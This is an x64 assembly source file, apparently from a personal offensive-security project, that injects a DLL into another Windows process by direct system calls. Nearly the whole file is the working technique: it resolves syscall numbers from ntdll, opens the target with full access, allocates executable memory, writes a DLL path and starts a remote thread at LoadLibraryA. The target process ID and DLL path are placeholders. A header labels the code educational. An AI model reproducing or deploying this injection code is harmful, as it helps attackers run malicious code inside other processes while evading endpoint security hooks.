; ╔═══════════════════════════════════════════════════════════╗
; ║                                                           ║
; ║                     ⚠️  WARNING!  ⚠️                     ║
; ║                                                           ║
; ║  @author: bekoo                                           ║
; ║  @website: 0xbekoo.github.io                              ║
; ║  @Technique: Using Direct Systemcalls                     ║
; ║                                                           ║
; ║  @warning: This project has been developed for            ║
; ║  educational purposes only. Its use in real scenarios     ║
; ║  is at one's own risk.                                    ║
; ║                                                           ║
; ╚═══════════════════════════════════════════════════════════╝

include utils.inc
include syscalls.inc

.data
    DLLPath db "C:\path\to\dll",0
    DLLSize QWORD 0 
.code 

GetSSN PROC 
    mov r15,[rsp]

    call GetProcAddress
    cmp rax,0
    jz ExitProgram

    mov rcx,rax
    mov eax,1
    imul rax,rax,0
    movzx eax,byte ptr [rcx+rax+4]

    mov [rsp],r15
    ret    
GetSSN ENDP 

mainCRTStartup PROC
    mov CID.UniqueProcess,0  ; Target Process ID is here  
    mov CID.UniqueThread,0
   
    mov ObjAttr.oLength,0    
    mov ObjAttr.RootDirectory,0    
    mov ObjAttr.ObjectName,0    
    mov ObjAttr.Attributes,0    
    mov ObjAttr.SecurityDescriptor,0    
    mov ObjAttr.SecurityQualityOfService,0    
    mov ObjAttr.oLength,sizeof OBJECT_ATTRIBUTES 

    lea rcx,[KERNEL32String]
    call GetModuleHandleA
    lea rdx,[Kernel32Address]
    mov rcx,rax
    call CheckFunctionResult

    lea rdx,[LoadLibraryString]
    mov rcx,Kernel32Address
    call GetProcAddress
    mov rcx,rax
    lea rdx,[LoadLibraryAddress]
    call CheckFunctionResult

	lea rcx,[NTDLLString]
	call GetModuleHandleA
	lea rdx,[NTDLLAddress]
    mov rcx,rax
	call CheckFunctionResult

    lea rdx,[NtOpenProcessString]
    mov rcx,NTDLLAddress
    call GetSSN

    lea r8,ObjAttr
    lea r9,CID
    mov edx,1FFFFFh
    lea rcx,HandleProcess
    call NtOpenProcess
    cmp rax,0
    jnz ExitProgram

    lea rdx,[NtAllocateVirtualString]
    mov rcx,NTDLLAddress
    call GetSSN

    mov rcx,sizeof DLLPath
    mov DLLSize,rcx
    mov dword ptr [rsp + 28h],40h
    mov dword ptr [rsp + 20h],3000h
    lea r9,DLLSize
    mov r8d,0
    lea rdx,RemoteBuffer
    mov rcx,HandleProcess
    call NtAllocateVirtualMemory
    cmp rax,0
    jnz ExitProgram

    lea rdx,[NtWriteVirtualString]
    mov rcx,NTDLLAddress
    call GetSSN

    mov qword ptr [rsp + 20h],0
    mov r9,sizeof DLLPath
    lea r8,DLLPath
    mov rdx,RemoteBuffer
    mov rcx,HandleProcess
    call NtWriteVirtualMemory
    cmp rax,0
    jnz ExitProgram

    lea rdx,[NtCreateThreadString]
    mov rcx,NTDLLAddress
    call GetSSN

    mov rcx,RemoteBuffer
    mov qword ptr [rsp + 50h],0
    mov qword ptr [rsp + 48h],0
    mov qword ptr [rsp + 40h],0
    mov qword ptr [rsp + 38h],0
    mov dword ptr [rsp + 30h],0
    mov qword ptr [rsp + 28h],rcx
    mov rcx,LoadLibraryAddress
    mov qword ptr [rsp + 20h],rcx
    mov r9,HandleProcess
    lea r8,ObjAttr
    mov edx,1FFFFFh
    lea rcx,HandleThread
    call NtCreateThreadEx

    lea rdx,[NtWaitString]
    mov rcx,NTDLLAddress
    call GetSSN

    xor r8,r8
    xor rdx,rdx
    mov rcx,HandleThread
    call NtWaitForSingleObject

    jmp ExitProgram
mainCRTStartup ENDP
END